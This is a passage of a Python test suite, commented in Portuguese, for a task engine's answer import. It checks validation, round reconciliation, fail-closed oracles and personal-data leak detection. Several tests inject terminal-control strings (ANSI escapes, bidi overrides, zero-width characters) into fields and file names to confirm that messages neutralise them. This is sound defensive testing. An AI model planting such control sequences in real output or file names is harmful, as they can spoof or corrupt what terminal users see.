        arquivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(arquivo, self.pasta)
        self.assertIn("q-campos-obrigatorios", saida)
        self.assertIn("ainda sem resposta", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    # ————— P1-2: todo identificador citado tem de existir na origem —————

    def test_direcao_inventada_e_recusada(self):
        export = self._export("decisao-direcoes.json",
                              {"direcao_escolhida": "direcao-inventada"})
        saida = self._reprova(export, self.pasta)
        self.assertIn("direcao-inventada", saida)
        self.assertIn("não é uma das direções", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_direcoes_sem_o_contrato_de_origem_bloqueia(self):
        (self.pasta / "contratos" / "03-direcoes.json").unlink()
        saida = self._reprova(self._export("decisao-direcoes.json"), self.pasta)
        self.assertIn("03-direcoes.json", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_escolha_inventada_no_grill_e_recusada(self):
        self._abre_rodada()
        dado = self._dado("grill-respostas.json", {"rodada": 1})
        dado["respostas"][0]["escolha_id"] = "opt-inventada"
        arquivo = self.raiz / "inv.json"
        arquivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(arquivo, self.pasta)
        self.assertIn("opt-inventada", saida)
        self.assertIn("q-campos-obrigatorios", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    # ————— P1-3: o disco é reconciliado, não adivinhado —————

    def test_resposta_orfa_no_disco_bloqueia(self):
        # A órfã aqui é IMPECÁVEL — JSON válido, tarefa certa, rodada coerente com o nome.
        # Só falta a rodada que a originou; se o teste usasse um arquivo corrompido, quem
        # bloquearia seria o validador, e o gate da órfã passaria despercebido.
        self._abre_rodada()
        orfa = self.pasta / "respostas" / "grill-rodada-99.json"
        orfa.parent.mkdir(parents=True, exist_ok=True)
        orfa.write_text(json.dumps(self._dado("grill-respostas.json", {"rodada": 99}),
                                   ensure_ascii=False), encoding="utf-8")
        antes = orfa.read_bytes()
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("grill-rodada-99.json", saida)
        self.assertEqual(orfa.read_bytes(), antes, "mexeu no arquivo alheio")
        self.assertFalse((self.pasta / "respostas" / "grill-rodada-1.json").exists())

    def test_contrato_da_rodada_invalido_bloqueia(self):
        # Mata M2: sem `carregar_e_validar`, um contrato fora do formato vira autoridade.
        contrato = self._abre_rodada()
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        del corpo["perguntas"]                       # campo obrigatório do grill-rodada-v1
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("perguntas", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_resposta_ja_guardada_invalida_bloqueia(self):
        # Mesma classe, do outro lado: resposta guardada fora do formato não conta como
        # rodada respondida — e não pode ser ignorada em silêncio.
        self._abre_rodada(1)
        self._abre_rodada(2)
        ruim = self.pasta / "respostas" / "grill-rodada-1.json"
        ruim.parent.mkdir(parents=True, exist_ok=True)
        corpo = self._dado("grill-respostas.json", {"rodada": 1})
        del corpo["respostas"]
        ruim.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2}), self.pasta)
        self.assertIn("respostas", saida)

    def test_resposta_ja_guardada_e_corrompida_bloqueia(self):
        self._abre_rodada()
        ruim = self.pasta / "respostas" / "grill-rodada-1.json"
        ruim.parent.mkdir(parents=True, exist_ok=True)
        ruim.write_text("{ truncado", encoding="utf-8")
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("grill-rodada-1.json", saida)
        # não pode virar "não há rodada aberta": o arquivo ilegível é o problema a contar
        self.assertNotIn("não tem rodada de grill esperando", saida)

    def test_contrato_da_rodada_de_outra_tarefa_bloqueia(self):
        # Mata M2: sem validar o contrato da rodada, o vínculo alheio passa.
        self._grava("contratos/04-grill-rodada-1.json", "grill-rodada.json", {"rodada": 1})
        contrato = self.pasta / "contratos" / "04-grill-rodada-1.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["tarefa_id"] = "outra-tarefa-2026-01-01"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("outra-tarefa-2026-01-01", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_contrato_da_rodada_com_numero_divergente_bloqueia(self):
        self._grava("contratos/04-grill-rodada-1.json", "grill-rodada.json", {"rodada": 2})
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("04-grill-rodada-1.json", saida)
        self.assertIn("rodada 2", saida)

    def test_duas_rodadas_abertas_bloqueiam(self):
        # Mata M1: com duas abertas, escolher a maior (ou a menor) é adivinhar.
        self._abre_rodada(1)
        self._abre_rodada(2)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2}), self.pasta)
        self.assertIn("mais de uma rodada", saida)
        self.assertIn("1", saida)
        self.assertIn("2", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_registro_apontando_rodada_inexistente_bloqueia(self):
        self._abre_rodada(1)
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = 7
        gravar_tarefa(self.pasta, registro)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("7", saida)

    # ————— P1-4: cópia + registro é uma operação retomável —————

    def test_retomada_conclui_o_avanco_apos_falha_no_registro(self):
        export = self._export("decisao-direcoes.json")
        original = gravar_tarefa

        def falha_ao_gravar(pasta, registro):
            raise OSError(errno.ENOSPC, "No space left on device")

        with mock.patch(f"{__name__}.gravar_tarefa", side_effect=falha_ao_gravar):
            self._reprova(export, self.pasta)
        destino = self.pasta / "respostas" / "decisao-direcoes.json"
        self.assertTrue(destino.exists(), "a resposta ficou guardada")
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "pesquisa-concluida")
        # repetir o mesmo comando precisa concluir, não travar para sempre
        self.assertEqual(importar_resposta(export, self.pasta), destino)
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "direcao-escolhida")
        self.assertEqual(destino.read_bytes(), export.read_bytes())
        del original

    def test_resposta_diferente_no_mesmo_destino_e_recusada(self):
        importar_resposta(self._export("decisao-direcoes.json"), self.pasta)
        outra = self._export("decisao-direcoes.json", {"comentario": "mudei de ideia"},
                             nome="outra.json")
        saida = self._reprova(outra, self.pasta)
        self.assertIn("diferente", saida)
        destino = self.pasta / "respostas" / "decisao-direcoes.json"
        self.assertNotIn("mudei de ideia", destino.read_text(encoding="utf-8"))

    def test_reimportar_direcoes_em_dia_diz_que_ja_foi_importada(self):
        export = self._export("decisao-direcoes.json")
        importar_resposta(export, self.pasta)
        self.assertIn("já foi importada", self._reprova(export, self.pasta))

    # ————— P2-6: o grill recusa reimportação pelo motivo certo —————

    def test_reimportar_grill_diz_que_ja_foi_importada(self):
        self._abre_rodada()
        export = self._export("grill-respostas.json", {"rodada": 1})
        importar_resposta(export, self.pasta)
        saida = self._reprova(export, self.pasta)
        self.assertIn("já foi importada", saida)
        self.assertNotIn("não tem rodada de grill esperando", saida)

    # ————— P2-5: dado citado nunca executa nada no terminal —————

    def test_controles_de_terminal_no_dado_nao_saem_crus(self):
        hostil = "alheia\"\n\x1b[31m\u200b\u202egnip\x85fim"
        export = self._export("decisao-direcoes.json", {"tarefa_id": hostil})
        saida = self._reprova(export, self.pasta)
        for bruto in ("\x1b", "\u202e", "\u200b", "\x85"):
            self.assertNotIn(bruto, saida, f"o controle {bruto!r} saiu cru na mensagem")
        self.assertEqual(saida.count("\n"), 1, "o dado forjou uma linha nova no recado")

    # ————— mutante M3: nenhum gate pode rodar depois da gravação —————

    def test_recusa_por_pergunta_faltante_nao_deixa_rastro(self):
        self._abre_rodada()
        dado = self._dado("grill-respostas.json", {"rodada": 1})
        dado["respostas"] = dado["respostas"][:1]
        arquivo = self.raiz / "falta.json"
        arquivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        self._reprova(arquivo, self.pasta)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [],
                         "gravou antes de conferir a rodada inteira")


class TestImportarR3(TestImportar):
    """Task 7 r3: a MESMA régua nos dois momentos, e ambiguidade sempre fecha.

    A r2 validou cada peça do disco isoladamente — schema, `tarefa_id`, número da rodada —
    e chamou isso de reconciliação. Não era: validar as peças não prova que a resposta
    guardada veio das perguntas daquela rodada. A conferência resposta×contrato agora é
    uma função só, chamada na importação E na leitura; enquanto for uma só, não há como
    os dois momentos divergirem de novo."""

    def _abre_rodada(self, rodada=1):
        return self._grava(f"contratos/04-grill-rodada-{rodada}.json", "grill-rodada.json",
                           {"rodada": rodada})

    def _guarda_resposta(self, rodada, ajustes=None, respostas=None):
        alvo = self.pasta / "respostas" / f"grill-rodada-{rodada}.json"
        alvo.parent.mkdir(parents=True, exist_ok=True)
        dado = self._dado("grill-respostas.json", dict({"rodada": rodada}, **(ajustes or {})))
        if respostas is not None:
            dado["respostas"] = respostas
        alvo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        return alvo

    def _perguntas_da_rodada_2(self):
        """Uma rodada 2 com perguntas próprias — ids que não existem na rodada 1."""
        contrato = self._dado("grill-rodada.json", {"rodada": 2})
        for i, pergunta in enumerate(contrato["perguntas"]):
            pergunta["id"] = f"q-rodada2-{i}"
            for j, opcao in enumerate(pergunta["opcoes"]):
                opcao["id"] = f"opt-rodada2-{i}-{j}"
        return contrato

    # ————— P1-A: a régua da importação vale também para o que já está no disco —————

    def test_contrato_adulterado_depois_da_importacao_bloqueia(self):
        self._abre_rodada(1)
        importar_resposta(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        # alguém edita o contrato JÁ respondido: as perguntas deixam de bater com a resposta
        contrato = self.pasta / "contratos" / "04-grill-rodada-1.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["perguntas"][0]["id"] = "q-trocada-depois"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        self._abre_rodada(2)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2},
                                           nome="r2.json"), self.pasta)
        self.assertIn("grill-rodada-1.json", saida)
        # desde a decisão 20 quem pega isto primeiro é o carimbo, e mais cedo: nem chega a
        # comparar pergunta a pergunta — o formulário inteiro já não é o mesmo
        self.assertIn("mudou depois", saida)
        self.assertFalse((self.pasta / "respostas" / "grill-rodada-2.json").exists())

    def test_resposta_guardada_com_perguntas_de_outra_rodada_bloqueia(self):
        """Envelope diz rodada 1, conteúdo é da rodada 2: cada peça passa, o vínculo não."""
        self._abre_rodada(1)
        contrato2 = self._perguntas_da_rodada_2()
        alvo = self.pasta / "contratos" / "04-grill-rodada-2.json"
        alvo.write_text(json.dumps(contrato2, ensure_ascii=False), encoding="utf-8")
        alheias = [{"pergunta_id": p["id"], "estado": "aprovada",
                    "escolha_id": p["opcoes"][0]["id"], "comentario": "", "duvida_texto": ""}
                   for p in contrato2["perguntas"]]
        self._guarda_resposta(1, respostas=alheias)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2},
                                           nome="r2.json"), self.pasta)
        # a recusa nomeia o arquivo guardado e as perguntas da rodada 1 que ele não cobre
        self.assertIn("grill-rodada-1.json", saida)
        self.assertIn("q-campos-obrigatorios", saida)
        self.assertFalse((self.pasta / "respostas" / "grill-rodada-2.json").exists())

    def test_escolha_guardada_fora_das_opcoes_da_pergunta_bloqueia(self):
        self._abre_rodada(1)
        contrato = json.loads((self.pasta / "contratos" / "04-grill-rodada-1.json")
                              .read_text(encoding="utf-8"))
        cruzadas = []
        for pergunta in contrato["perguntas"]:
            outra = next(p for p in contrato["perguntas"] if p["id"] != pergunta["id"])
            cruzadas.append({"pergunta_id": pergunta["id"], "estado": "aprovada",
                             "escolha_id": outra["opcoes"][0]["id"],
                             "comentario": "", "duvida_texto": ""})
        self._guarda_resposta(1, respostas=cruzadas)
        self._abre_rodada(2)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2},
                                           nome="r2.json"), self.pasta)
        self.assertIn("grill-rodada-1.json", saida)

    def test_a_conferencia_e_a_mesma_funcao_nos_dois_momentos(self):
        """Gate da classe: se alguém reintroduzir uma segunda régua, isto quebra."""
        self.assertIn("_conferir_respostas_do_grill",
                      inspect.getsource(conferir_respostas_de_grill_guardadas),
                      "a leitura do disco voltou a usar régua própria")
        # em `importar_resposta` a régua entra pela função que serve aos DOIS ramos
        self.assertIn("_conferir_resposta_contra_origem", inspect.getsource(importar_resposta))
        self.assertIn("_conferir_respostas_do_grill",
                      inspect.getsource(_conferir_resposta_contra_origem))

    # ————— P1-B: ambiguidade fecha, sempre —————

    def test_duas_rodadas_abertas_bloqueiam_mesmo_com_o_registro_apontando(self):
        """O registro é cache; cache não desfaz ambiguidade do disco."""
        self._abre_rodada(1)
        self._abre_rodada(2)
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = 1
        gravar_tarefa(self.pasta, registro)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("mais de uma rodada", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_nomes_diferentes_para_a_mesma_rodada_bloqueiam(self):
        self._abre_rodada(1)
        gemeo = self.pasta / "contratos" / "04-grill-rodada-01.json"
        gemeo.write_text(json.dumps(self._dado("grill-rodada.json", {"rodada": 1}),
                                    ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        # `01` nem chega a virar número: barra antes, como nome fora do padrão do motor
        self.assertIn("04-grill-rodada-01.json", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_respostas_com_nomes_que_colidem_bloqueiam(self):
        self._abre_rodada(1)
        self._guarda_resposta(1)
        gemeo = self.pasta / "respostas" / "grill-rodada-01.json"
        gemeo.write_text(json.dumps(self._dado("grill-respostas.json", {"rodada": 1}),
                                    ensure_ascii=False), encoding="utf-8")
        self._abre_rodada(2)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2},
                                           nome="r2.json"), self.pasta)
        self.assertIn("grill-rodada-01.json", saida)
        self.assertFalse((self.pasta / "respostas" / "grill-rodada-2.json").exists())

    # ————— mutante M4: opção válida, mas de OUTRA pergunta —————

    def test_escolha_valida_de_outra_pergunta_e_recusada_na_importacao(self):
        self._abre_rodada(1)
        dado = self._dado("grill-respostas.json", {"rodada": 1})
        contrato = json.loads((self.pasta / "contratos" / "04-grill-rodada-1.json")
                              .read_text(encoding="utf-8"))
        # 'opt-trilha-completa' existe — na OUTRA pergunta. Validar contra a união das
        # opções da rodada deixaria isso passar; é o mutante M4.
        outra = contrato["perguntas"][1]["opcoes"][0]["id"]
        self.assertNotIn(outra, [o["id"] for o in contrato["perguntas"][0]["opcoes"]])
        dado["respostas"][0]["escolha_id"] = outra
        arquivo = self.raiz / "cruzada.json"
        arquivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(arquivo, self.pasta)
        self.assertIn(outra, saida)
        self.assertIn("não é uma das opções", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    # ————— P2-5: TODO eco passa pela mesma neutralização —————

    HOSTIL = "a\"\n\x1b[31m​‮   z"

    def _controles_crus(self, texto):
        return [c for c in texto
                if c != " " and unicodedata.category(c) in ("Cc", "Cf", "Zl", "Zp", "Zs")
                and c != "\n"]

    def test_resumo_neutraliza_toda_categoria_invisivel(self):
        saida = _resumo(self.HOSTIL, 200)
        self.assertEqual(self._controles_crus(saida), [], repr(saida))
        # e o espaço comum continua espaço: neutralizar tudo tornaria a mensagem ilegível
        self.assertIn("com espaço", _resumo("com espaço", 200))

    def test_nome_de_arquivo_hostil_nao_ecoa_controles(self):
        alvo = self.raiz / ("hostil" + self.HOSTIL.replace("\n", "") + ".json")
        try:
            alvo.write_text("{ nao e json", encoding="utf-8")
        except OSError:
            self.skipTest("este sistema de arquivos recusa o nome hostil")
        saida = self._reprova(alvo, self.pasta)
        self.assertEqual(self._controles_crus(saida), [], repr(saida))

    def test_nenhum_eco_novo_de_caminho_escapa_da_neutralizacao(self):
        """Gate de classe: eco cru de caminho no código-fonte quebra aqui.

        Sonda pega o vetor de hoje; isto pega o de amanhã — quem escrever
        `fail(f"... '{caminho}' ...")` sem `citar` recebe a lista do que falta."""
        fonte = Path(__file__).read_text(encoding="utf-8")
        # só o motor: da primeira linha até o começo dos testes
        fonte = fonte[:fonte.index("class TestFundacao")]
        crus = []
        for numero, linha in enumerate(fonte.splitlines(), 1):
            if 'f"' not in linha and "f'" not in linha:
                continue
            # `arquivo`, `alvo`, `destino` e `pasta` são sempre caminho de disco neste
            # motor; `caminho`/`origem` também nomeiam trilha JSON interna (`$.campo`),
            # cujos pedaços vindos do documento já passam por `citar` na construção.
            for expr in re.findall(r"\{(arquivo|alvo|destino|pasta)(?:\.name)?\}", linha):
                crus.append(f"linha {numero}: {linha.strip()[:80]}")
        self.assertEqual(crus, [], "eco de caminho sem citar()/_resumo():\n  " +
                         "\n  ".join(crus))

    def test_nenhuma_recusa_do_importar_ecoa_controle_cru(self):
        """Varredura: vários vetores hostis, uma régua só para todas as mensagens."""
        cenarios = []
        cenarios.append(("tarefa_id", self._export("decisao-direcoes.json",
                                                   {"tarefa_id": self.HOSTIL}, "t1.json")))
        cenarios.append(("direcao", self._export("decisao-direcoes.json",
                                                 {"direcao_escolhida": self.HOSTIL}, "t2.json")))
        dado = self._dado("grill-respostas.json", {"rodada": 1})
        dado["respostas"][0]["pergunta_id"] = self.HOSTIL
        arquivo = self.raiz / "t3.json"
        arquivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        cenarios.append(("pergunta_id", arquivo))
        self._abre_rodada(1)
        for rotulo, entrada in cenarios:
            saida = self._reprova(entrada, self.pasta)
            self.assertEqual(self._controles_crus(saida), [],
                             f"{rotulo} ecoou controle cru: {saida!r}")


class TestHistoriaNoTempo(unittest.TestCase):
    """A jornada não anda para trás — e `--data` aceita hora, não só o dia.

    Achado da Task 12: `--data` só recebia AAAA-MM-DD e virava meia-noite, então duas
    etapas do mesmo dia empatavam; e nada impedia um histórico que retrocede. Foi por
    aí que um exemplo com jornada incoerente passou."""

    DATA = "2026-08-21"

    def setUp(self):
        self._temp = tempfile.TemporaryDirectory()
        self.raiz = Path(self._temp.name)
        self.addCleanup(self._temp.cleanup)
        self.pasta = criar_tarefa(self.raiz, "Lançar apartamentos do Stay pelo chat", self.DATA)

    def _tarefa_com_historico(self, instantes):
        registro = carregar_tarefa(self.pasta)
        etapas = ETAPAS[:len(instantes)]
        registro["historico"] = [
            {"etapa": etapa, "em": em, "por": "temcomo (motor)"}
            for etapa, em in zip(etapas, instantes)]
        registro["etapa"] = etapas[-1]
        registro["gerado_em"] = instantes[-1]
        return registro

    def test_historico_que_retrocede_e_reprovado(self):
        registro = self._tarefa_com_historico(
            ["2026-08-21T10:00:00", "2026-08-21T09:00:00"])
        erros = regras_extras(registro)
        self.assertNotEqual(erros, [], "a jornada andou para trás e o contrato aceitou")
        self.assertTrue(any("para trás" in e or "antes" in e for e in erros), erros)

    def test_historico_que_avanca_ou_empata_e_aceito(self):
        for instantes in (["2026-08-21T10:00:00", "2026-08-21T10:00:00"],
                          ["2026-08-21T10:00:00", "2026-08-21T10:00:01"],
                          ["2026-08-20T23:59:59", "2026-08-21T00:00:00"]):
            registro = self._tarefa_com_historico(instantes)
            self.assertEqual([e for e in regras_extras(registro) if "trás" in e], [],
                             f"reprovou uma jornada coerente: {instantes}")

    def test_fuso_diferente_nao_finge_retrocesso(self):
        """Mesmo instante em fusos diferentes não é retrocesso — comparar texto seria."""
        registro = self._tarefa_com_historico(
            ["2026-08-21T10:00:00-04:00", "2026-08-21T15:00:00+00:00"])
        self.assertEqual([e for e in regras_extras(registro) if "trás" in e], [])

    def test_data_com_hora_e_aceita_no_avanco(self):
        self.assertEqual(agora_iso("2026-08-21T14:30:00"), "2026-08-21T14:30:00")
        self.assertEqual(agora_iso("2026-08-21"), "2026-08-21T00:00:00")
        self.assertEqual(agora_iso("2026-08-21T14:30:00-04:00"), "2026-08-21T14:30:00-04:00")

    def test_data_impossivel_continua_recusada(self):
        for ruim in ("2026-02-31", "2026-13-01", "ontem", "2026-08-21T25:00:00"):
            saida = io.StringIO()
            with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit):
                agora_iso(ruim)
            self.assertNotIn("Traceback", saida.getvalue())

    def test_duas_etapas_no_mesmo_dia_podem_ser_distinguidas(self):
        self._grava("contratos/01-objetivo.json", "objetivo.json")
        self._grava("contratos/02-pesquisa.json", "pesquisa.json")
        avancar_etapa(self.pasta, "objetivo-confirmado", data="2026-08-21T09:00:00")
        avancar_etapa(self.pasta, "pesquisa-concluida", data="2026-08-21T14:30:00")
        historico = carregar_tarefa(self.pasta)["historico"]
        self.assertEqual([p["em"] for p in historico][-2:],
                         ["2026-08-21T09:00:00", "2026-08-21T14:30:00"])

    def _grava(self, destino, exemplo):
        alvo = self.pasta / destino
        alvo.parent.mkdir(parents=True, exist_ok=True)
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo).read_text(encoding="utf-8"))
        dado["tarefa_id"] = self.pasta.name
        alvo.write_text(json.dumps(dado, ensure_ascii=False, indent=2), encoding="utf-8")


class TestExemplosSemDadoPessoal(unittest.TestCase):
    """Os exemplos vão para um repositório público — não podem levar rastro de ninguém.

    A rastreabilidade continua exigida pelo contrato (`regras_extras` cobra sessão e
    transcrição de todo trabalho de agente); o que muda é que os valores são fictícios e
    se anunciam como tais."""

    def test_nenhum_exemplo_carrega_dado_pessoal(self):
        vazamentos = []
        for caminho in sorted(PASTA_DE_EXEMPLOS.rglob("*.json")):
            texto = caminho.read_text(encoding="utf-8", errors="replace")
            for marca in ("/Users/", "/home/", "C:\\\\Users", ".claude/projects"):
                if marca in texto:
                    vazamentos.append(f"{caminho.name}: {marca}")
            for achado in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-"
                                     r"[0-9a-f]{4}-[0-9a-f]{12}", texto):
                vazamentos.append(f"{caminho.name}: identificador de sessão real {achado}")
        self.assertEqual(vazamentos, [], f"dado pessoal nos exemplos: {vazamentos}")

    def test_o_artefato_entregue_nao_carrega_nome_pessoal(self):
        """As páginas vão para fora, e comentário de template vai junto.

        Achado da revisão da decisão 20: o nome do dono do projeto estava em comentários do
        motor e dos DOIS templates — e os dos templates saíam dentro do HTML entregue.
        Rastreabilidade se faz por número e data da decisão, não por nome de pessoa."""
        # A sentinela é derivada, não escrita: o nome do dono do projeto não pode estar
        # no repositório nem como literal de teste — foi assim que a rodada anterior
        # reintroduziu exatamente o dado que o gate existe para caçar (decisão 20, r2).
        # A busca é case-insensitive: outra capitalização do mesmo nome passava antes.
        pessoais = [bytes.fromhex("6c75636173").decode(),        # o nome, em minúsculas
                    "/users/", "27e54fe6", ".claude/projects"]
        alvos = [PASTA_DO_MOTOR / "temcomo.py",
                 PASTA_DE_TEMPLATES / "direcoes.html.tpl",
                 PASTA_DE_TEMPLATES / "grill.html.tpl",
                 PASTA_DE_ASSETS / "README.md"]
        for caminho in alvos:
            texto = caminho.read_text(encoding="utf-8", errors="replace")
            if caminho.name == "temcomo.py":
                # o motor é o que vai a produção; abaixo desta linha vivem os testes, que
                # precisam citar as marcas justamente para poder procurá-las
                texto = texto[:texto.index(chr(10) + "class Test")]
            texto = texto.casefold()
            for marca in pessoais:
                self.assertNotIn(marca, texto,
                                 f"{caminho.name} carrega dado pessoal ({marca!r})")
        for exemplo, render in (("direcoes.json", render_direcoes),
                                ("grill-rodada.json", render_grill)):
            pagina = render(json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo)
                                       .read_text(encoding="utf-8")))
            dobrada = pagina.casefold()
            for marca in pessoais:
                self.assertNotIn(marca, dobrada,
                                 f"a página de {exemplo} entrega dado pessoal ({marca!r})")

    def test_a_rastreabilidade_ficticia_se_declara(self):
        for caminho in sorted(PASTA_DE_EXEMPLOS.rglob("*.json")):
            try:
                dado = json.loads(caminho.read_text(encoding="utf-8"))
            except ValueError:
                continue                      # o exemplo de JSON quebrado é proposital
            produzido = (dado or {}).get("produzido_por") if isinstance(dado, dict) else None
            if not isinstance(produzido, dict):
                continue
            sessao = produzido.get("sessao_id")
            if isinstance(sessao, str) and sessao not in (NAO_DETERMINAVEL,):
                self.assertIn("exemplo", sessao,
                              f"{caminho.name}: sessão não se declara como exemplo")


class TestFailClosed(unittest.TestCase):
    """Task 8: o autoteste prova que a validação REPROVA o que tem de reprovar.

    Suíte verde só diz que o que eu escrevi passa. Estas provas atacam os exemplos
    válidos — que são a fonte golden do projeto — e exigem recusa. É a diferença entre
    'meus testes passam' e 'o motor fecha'."""

    def test_todo_campo_obrigatorio_removido_reprova(self):
        """Exaustivo de propósito: campo a campo, em todo exemplo válido.

        Sondar um campo escolhido a dedo provaria que aquele campo é conferido. Isto
        prova a classe inteira — e denuncia `required` que a validação ignora."""
        provas = provas_de_campo_obrigatorio()
        self.assertGreater(len(provas), 40, "a bateria precisa cobrir os oito contratos")
        for exemplo, campo, erros in provas:
            self.assertNotEqual(erros, [],
                                f"'{exemplo}' passou sem o campo obrigatório {campo}")

    def test_duplicar_fora_da_caixa_reprova(self):
        provas = provas_de_fora_da_caixa()
        self.assertGreaterEqual(len(provas), 2, "direções e grill precisam ser atacados")
        for exemplo, erros in provas:
            self.assertNotEqual(erros, [], f"'{exemplo}' aceitou duas opções fora da caixa")
            self.assertTrue(any("fora da caixa" in e for e in erros), erros)

    def test_as_provas_fail_closed_passam_no_gate_do_autoteste(self):
        self.assertEqual(provas_fail_closed(), [])

    # ————— o oráculo: a prova precisa saber o tamanho que deveria ter —————

    def test_a_cobertura_nao_pode_encolher_em_silencio(self):
        """A r1 aceitava `len(provas) > 40`: dava para perder 195 provas e ficar verde.

        Agora a contagem é AFIRMADA contra o oráculo — e o oráculo é derivado dos
        schemas, então schema que ganha campo muda o número esperado junto."""
        esperado = carregar_oraculo()["total_de_provas"]
        self.assertEqual(len(provas_de_campo_obrigatorio()) + len(provas_de_fora_da_caixa()),
                         esperado)
        with mock.patch(f"{__name__}.provas_de_campo_obrigatorio",
                        return_value=provas_de_campo_obrigatorio()[:41]):
            self.assertNotEqual(provas_fail_closed(), [],
                                "a cobertura caiu para 41 e o gate não percebeu")

    def test_enfraquecer_um_schema_e_denunciado(self):
        """O vetor exato do revisor: tirar um `required` reduzia as provas em silêncio."""
        definicao = carregar_schema("direcoes-v1")
        original = json.loads(json.dumps(definicao))
        try:
            itens = definicao["properties"]["direcoes"]["items"]
            itens["required"] = [c for c in itens["required"] if c != "nome"]
            problemas = provas_fail_closed()
        finally:
            _CACHE_DE_SCHEMAS["direcoes-v1"] = original
        self.assertNotEqual(problemas, [],
                            "um schema enfraquecido reduziu a prova e ninguém acusou")
        # A denúncia vem pela CONTAGEM: o schema mudou em memória, então o sha do arquivo
        # continua o mesmo — e ainda assim o encolhimento da prova é visível. Os números
        # saem do oráculo, nunca escritos à mão: foi assim que este teste envelheceu quando
        # os schemas ganharam o carimbo da decisão 20.
        esperado = carregar_oraculo()
        por_exemplo = esperado["provas_por_exemplo"]["direcoes.json"]
        total = esperado["total_de_provas"]
        self.assertTrue(any(f"e o oráculo esperava {por_exemplo}" in p and "direcoes.json" in p
                            for p in problemas), problemas)
        self.assertTrue(any(f"e o oráculo esperava {total}" in p for p in problemas),
                        problemas)

    def test_exemplo_editado_por_fora_e_denunciado(self):
        """Golden alterado muda o que a prova prova — tem de exigir decisão consciente."""
        caminho = PASTA_DE_EXEMPLOS / "validos" / "objetivo.json"
        original = caminho.read_bytes()
        try:
            dado = json.loads(original.decode("utf-8"))
            dado["objetivo_leigo"] = "outro objetivo qualquer"
            caminho.write_text(json.dumps(dado, ensure_ascii=False, indent=2), encoding="utf-8")
            problemas = problemas_do_oraculo()
        finally:
            caminho.write_bytes(original)
        self.assertNotEqual(problemas, [], "exemplo golden mudou e o oráculo não viu")
        self.assertTrue(any("objetivo.json" in p for p in problemas), problemas)

    def test_o_oraculo_confere_com_o_disco(self):
        self.assertEqual(problemas_do_oraculo(), [])

    def test_o_gate_denuncia_quando_a_validacao_afrouxa(self):
        """O gate tem de ser sensível: se o validador parar de reprovar, ele acusa."""
        with mock.patch(f"{__name__}.validar_contra_schema", return_value=[]), \
             mock.patch(f"{__name__}.regras_extras", return_value=[]):
            problemas = provas_fail_closed()
        self.assertNotEqual(problemas, [], "o gate ficou cego a um validador permissivo")


class TestChecagensEstaticas(unittest.TestCase):
    """As regras do parecer técnico §9, como funções puras aplicadas às páginas geradas."""

    def setUp(self):
        self.direcoes = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                                   .read_text(encoding="utf-8"))
        self.grill = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                                .read_text(encoding="utf-8"))

    def test_paginas_reais_passam_em_todas_as_checagens(self):
        self.assertEqual(checagens_estaticas(), [])

    # Cada veneno é uma sabotagem REAL da página, não um literal escolhido para casar com
